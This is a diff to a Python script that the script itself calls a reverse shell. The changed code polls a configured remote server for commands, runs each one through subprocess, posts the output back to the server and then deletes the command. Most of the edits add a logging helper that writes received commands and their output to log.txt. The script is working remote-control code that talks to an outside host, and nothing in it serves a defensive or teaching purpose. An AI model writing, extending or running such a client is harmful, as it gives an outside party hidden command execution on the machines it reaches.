@@ -7,6 +7,13 @@ import subprocess
 import config
 
 
+def log(text: str):
+    if config.LOG_EXECUTED_CMD:
+        print(text)
+        with open("log.txt", "a+") as f:
+            f.write(text)
+
+
 class API(StrEnum):
     cmd = f"{config.SERVER_HOST}/shell/cmd"
     output = f"{config.SERVER_HOST}/shell/output"
@@ -17,9 +24,8 @@ def run_cmd():
         shell_cmd = requests.get(API.cmd)
         command = shell_cmd.json()["cmd"]
         if command:
-            print(f"\nReceived command: {command}")
+            log(f"\nReceived command: {command}")
         else:
-            print("No new command...")
             return
 
         cmd_output = ""
@@ -28,16 +34,17 @@ def run_cmd():
             cmd_output = str(result.stdout)
         except Exception as e:
             cmd_output = "Error while executing received command!"
-            print(cmd_output)
+        log(cmd_output)
+
         requests.post(API.output, json=cmd_output)
         requests.delete(API.cmd)
 
     except Exception as e:
         print("Error!")
-        print(e)
 
 
 def main():
+    print("Reverse Shell was started!")
     while True:
         run_cmd()
         timeout = config.TIMEOUT
